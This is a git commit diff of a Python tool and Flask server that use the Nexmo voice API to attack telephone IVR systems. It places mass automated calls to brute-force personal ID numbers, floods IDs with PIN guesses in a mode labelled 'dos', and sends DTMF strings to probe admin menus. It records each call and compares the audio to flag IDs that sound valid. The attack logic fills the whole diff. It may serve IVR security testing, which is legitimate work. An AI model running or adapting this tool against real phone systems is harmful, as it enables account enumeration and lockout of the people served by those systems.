faff184767c7514cc4748a7cca5c76567c04b3f9
YigalTheEagle <33592473+YigalTheEagle@users.noreply.github.com>
2019-11-04 11:59:27 +0200

    Added more flexibility

--- calling_and_iterating_IDs.py
+++ calling_and_iterating_IDs.py
@@ -1,31 +1,71 @@
-import nexmo
-import sys, urllib.parse
+import argparse
+import sys
+import urllib.parse
+from copy import deepcopy
 from pprint import pprint
 
-client=nexmo.Client(application_id='PUT NEXMO APPLICATION ID HERE',private_key='PUT PATH TO API PRIVATE KEY HERE',)
-did_you_use_it_good=False
-def call_creation_id(personal_id):
-  response = client.create_call({'to':[{'type':'phone','number':'PUT NUMBER TO CALL TO HERE'}],'from':{'type':'phone','number':'00'},"answer_url":["http://PUT_API_ADDRESS_HERE/nexmo/api/answering/"+str(personal_id)],'length_timer':50})
-  pprint("sending call for id " + str(personal_id))
+import nexmo
 
-def call_creation_strings(strings_to_send):
-  response = client.create_call({'to':[{'type':'phone','number':'PUT NUMBER TO CALL TO HERE'}],'from':{'type':'phone','number':'00'},"answer_url":["http://PUT_API_ADDRESS_HERE/nexmo/api/answering_strings/"+str(strings_to_send)],'length_timer':50})
-  pprint("sending call for these strings " + str(strings_to_send))
-
-if (sys.argv[1]=='id'):
-  pprint('You chose ID bruteforcing by range - argv2 is the range start, argv3 is the end')
-  for x in range(int(sys.argv[2]),int(sys.argv[3])):
-    call_creation_id(x)
-  did_you_use_it_good=True
-
-if (sys.argv[1]=='strings'):
-  pprint('You chose sending strings to enumerate admin interfaces and cause weird behaviors')
-  call_creation_strings((urllib.parse.quote(sys.argv[2])))
-  did_you_use_it_good=True
-
-if(did_you_use_it_good):
-  pprint('Finished, look at your API')
-else:
-  pprint('You did not choose a valid option, either choose "id" or "strings"')
+client = nexmo.Client(application_id='PUT APPLICATION ID HERE',
+                      private_key='PUT PRIVATE KEY DIRECTORY HERE', )
 
 
+def parse_args():
+    parser = argparse.ArgumentParser(epilog='Example: python ' + sys.argv[
+        0] + ' -p 1672456824 -t enum -a http://api_server.com/ -enumidstart 555555555 -enumidend 666666666')
+    parser.add_argument('-phone', "-p", help="target IVR phone number")
+    parser.add_argument('-t', help="Choose the test type. id enumeration, dos versus a supplied id, or strings",
+                        choices=['enum', 'dos', 'strings'], default='id', nargs='?')
+    parser.add_argument('-a', "-api", help="your API server address, to communicate with nexmo's API server")
+    parser.add_argument("-enumidstart", help="the ID to start from")
+    parser.add_argument("-enumidend", help="the last ID in the range")
+    parser.add_argument("-dospins",
+                        help="the pins to send in the conversation, seperated by a comma, for example 123456,123154,123123")
+    parser.add_argument("-strings", help="The DTMF strings to send in the conversation, for example abcdpp*123")
+    return parser.parse_args()
+
+
+def call_this(ncco, personal_id):
+    calledncco = deepcopy(ncco) #had to use deepcopy to copy the type of ncco (dict list)
+    calledncco["answer_url"] = [calledncco["answer_url"][0] + str(personal_id)]
+    response = client.create_call(calledncco)
+    pprint("sending call for id " + str(personal_id))
+
+
+def call_creation_strings(ncco,strings_to_send):
+    response = client.create_call(ncco)
+    pprint("sending call for these strings " + str(strings_to_send))
+
+
+def build_first_ncco(phonenumber, apiendpoint):
+    ncco = {'to': [{'type': 'phone', 'number': str(phonenumber)}], 'from': {'type': 'phone', 'number': '972541234567'},
+            "answer_url": [str(apiendpoint)], 'length_timer': 50}
+    return ncco
+
+
+def iterate_on_ids(ncco, start_id, end_id):
+    for x in range(int(start_id), int(end_id)):
+        call_this(ncco, x)
+
+
+def main():
+    chosenArgs = parse_args()
+    ncco = build_first_ncco(chosenArgs.phone, chosenArgs.a)
+    if (chosenArgs.t == "enum"):
+        pprint('You chose ID enumeration bruteforcing by range - enumidstart is the range start, enumidend is the end')
+        ncco["answer_url"] = [ncco["answer_url"][0] + "answering/"]
+        iterate_on_ids(ncco, int(chosenArgs.enumidstart), int(chosenArgs.enumidend))
+        pprint("Finished calling enumeration on all provided IDs")
+    if (chosenArgs.t == "dos"):
+        pprint("You chose DOSing IDs with PINs seperated by a comma")
+        ncco["answer_url"] = [ncco["answer_url"][0] + "answering-dos/" + str(chosenArgs.dospins)+"/"]
+        iterate_on_ids(ncco, int(chosenArgs.enumidstart), int(chosenArgs.enumidend))
+        pprint("Finished sending PINs for all IDs")
+    if (chosenArgs.t == "strings"):
+        pprint("You chose sending strings to enumerate admin interfaces and cause weird behaviors")
+        ncco["answer_url"] = [ncco["answer_url"][0] + "answering_strings/"+str(chosenArgs.strings)]
+        call_creation_strings(urllib.parse.quote(chosenArgs.strings))
+
+
+if __name__ == "__main__":
+    main()
--- event_api.py
+++ event_api.py
@@ -7,8 +7,7 @@ from dtw import dtw
 from numpy.linalg import norm
 import os
 
-
-client = nexmo.Client(application_id='PUT APPLICATION ID HERE',private_key='PUT PRIVATE KEY HERE',) # make sure to place your nexmo appID and private key here
+client = nexmo.Client(application_id='PUT APPLICATION ID HERE',private_key='PUT PRIVATE KEY DIRECTORY HERE',) # make sure to place your nexmo appID and private key here
 app=Flask(__name__)
 ConvoArr={}
 
@@ -29,42 +28,67 @@ def sending_id_for_convo_uuid(convo_uuid):
     for single_digit in ConvoArr[convo_uuid]['personal_id']:
         whatever = client.send_dtmf(ConvoArr[convo_uuid]['uuid'], digits=single_digit)
     return 'boom boom'
+
+def sending_pin_for_convo_uuid(convo_uuid,pin):
+    for single_digit in pin:
+        whatever = client.send_dtmf(ConvoArr[convo_uuid]['uuid'], digits=single_digit)
+    return 'boom boom'
+
 def sending_strings_for_convo_uuid(convo_uuid):
     for x in ConvoArr[convo_uuid]['strings_to_send']:
         whateverr = client.send_dtmf(ConvoArr[convo_uuid]['uuid'], digits=x)
     return 'pow'
 
-@app.route("/nexmo/api/answering/<string:personal_id>")
+@app.route("/api/answering/<string:personal_id>")
 def answer_call(personal_id):
+    while(len(str(personal_id))<9):
+        personal_id="0"+personal_id
     ConvoArr[request.args.get('conversation_uuid')]={"uuid":request.args.get('uuid'),"personal_id":personal_id}
-    ncco = [{"action": "input", "eventUrl": ["http://PUT_API_ADDRESS_HERE/nexmo/api/send_id"], "name": "waiting", "timeOut": 3},{"action": "record","eventUrl": ["http://PUT_API_ADDRESS_HERE/nexmo/api/recordings/id"], "name": "send_record","timeOut":4}]
+    ncco = [{"action": "input", "eventUrl": ["http://api_endpoint/api/send_id"], "name": "waiting", "timeOut": 3},{"action": "record","eventUrl": ["http://api_endpoint/api/recordings/id"], "name": "send_record","timeOut":4}]
     print("Started call for ID: "+personal_id)
     return jsonify(ncco)
 
+@app.route("/api/answering-dos/<string:pins>/<string:personal_id>/")
+def answer_all_with_dos(personal_id,pins):
+    pinArray=pins.split(",")
+    ncco=[{"action":"input","eventUrl":["http://api_endpoint/api/send_id"],"name":"waiting","timeOut":3},{"action":"record","eventUrl":["http://api_endpoint/api/recordings/dos"],"name":"send_record"}]
+    for i in range(0,len(pinArray)):
+        ncco.append({"action": "input", "eventUrl": ["http://api_endpoint/api/send_pin/" + pinArray[i]], "name":"waiting","timeOut": 5})
+    ConvoArr[request.args.get('conversation_uuid')]={"uuid":request.args.get('uuid'),"personal_id":personal_id,"pinArray":pins}
+    ncco.append({"action":"input","eventUrl":["http://api_endpoint/api/just_wait/"],"name":"waiting","timeOut":15})
+    print("Started DOS call for ID: " + personal_id+", with PINs "+pins)
+    return jsonify(ncco)
 
-@app.route("/nexmo/api/answering_strings/<string:strings_to_send>")
+@app.route("/api/answering_strings/<string:strings_to_send>")
 def sending_abcd(strings_to_send):
     ConvoArr[request.args.get('conversation_uuid')] = {"uuid": request.args.get('uuid'), "strings_to_send": strings_to_send}
     timeoutseconds=len(strings_to_send)/3
     ncco = [
-        {"action": "input", "eventUrl": ["http://PUT_API_ADDRESS_HERE/nexmo/api/send_strings"], "name": "waiting", "timeOut": timeoutseconds},
-        {"action": "record", "eventUrl": ["http://PUT_API_ADDRESS_HERE/nexmo/api/recordings/strings"], "name": "send_record",
+        {"action": "input", "eventUrl": ["http://api_endpoint/api/send_strings"], "name": "waiting", "timeOut": timeoutseconds},
+        {"action": "record", "eventUrl": ["http://api_endpoint/api/recordings/strings"], "name": "send_record",
          "timeOut": 10}]
     return jsonify(ncco)
 
-@app.route("/nexmo/api/send_id", methods=['POST'])
+@app.route("/api/send_id", methods=['POST'])
 def sending_id():
     data = request.get_json()
     sending_id_for_convo_uuid(data['conversation_uuid'])
     return "I wish I was a little bit taller"
 
-@app.route("/nexmo/api/send_strings", methods=['POST'])
+
+@app.route("/api/send_strings", methods=['POST'])
 def sending_strings():
     data = request.get_json()
     sending_strings_for_convo_uuid(data['conversation_uuid'])
     return "I wish I was a baller"
 
-@app.route("/nexmo/api/recordings/<string:functionality>", methods=['POST'])
+@app.route("/api/send_pin/<string:pin>", methods=['POST'])
+def sending_pin(pin):
+    data = request.get_json()
+    sending_pin_for_convo_uuid(data['conversation_uuid'],pin)
+    return "I wish I had a girl, that looked good, I would call her"
+
+@app.route("/api/recordings/<string:functionality>", methods=['POST'])
 def recordings(functionality):
     data=request.get_json()
     a_record=client.get_recording(data['recording_url'])
@@ -77,15 +101,21 @@ def recordings(functionality):
         if(int(comparedValue)>40000 and int(comparedValue)<150000): # this will check if the file is different from the wrong ID recording, above 40000 value means the recording contains a different phrase WARNING: will contain false positives due to inconsistency in the phone line
             new_file_name = "Difference_" + str(int(comparedValue)) + "_" + fileName
             print("The ID: "+ConvoArr[data['conversation_uuid']]['personal_id']+" returned a different response, comparing it against the right ID recording")
-            newcomparison=compare_Audio_Files('rightID.mp3',fileName) #this will check if the file is similar to the right ID recording, below 45000 over a phone line will most likely mean that the soundfile contains audio that is similar to your right ID recording
+            newcomparison=compare_Audio_Files('rightID.mp3',fileName)
             if(int(newcomparison)<45000):
                 new_file_name = "RightID_Difference_" + str(int(newcomparison)) + "_"+fileName
-                os.rename(fileName,"check_these/special_check/"+new_file_name)
+                os.rename(fileName,new_file_name)
                 print("The ID " +ConvoArr[data['conversation_uuid']]['personal_id'] + " sounds like the right ID recording!!!!")
             else:
-                os.rename(fileName, "check_these/" + new_file_name)
+                os.rename(fileName, new_file_name)
         else:
-            os.rename(fileName, "supposed_to_be_garbage/" + "maybe_garbage" + fileName)
+            os.rename(fileName, "maybe_garbage" + fileName)
+    if (functionality == 'dos'):
+        fileName = "ID_DOSed_" + ConvoArr[data['conversation_uuid']]['personal_id'] + "_PINS_"+str(ConvoArr[data['conversation_uuid']]["pinArray"])+".mp3"
+        f = open(fileName, 'wb+')
+        f.write(a_record)
+        f.close()
+        print("ID: " + str(ConvoArr[data['conversation_uuid']]['personal_id']) + " was DOSed with PINs: " + str(ConvoArr[data['conversation_uuid']]["pinArray"]))
     if(functionality=='strings'):
         f = open("Sent_Strings_" + ConvoArr[data['conversation_uuid']]['strings_to_send'] + ".mp3", 'wb+')
         f.write(a_record)
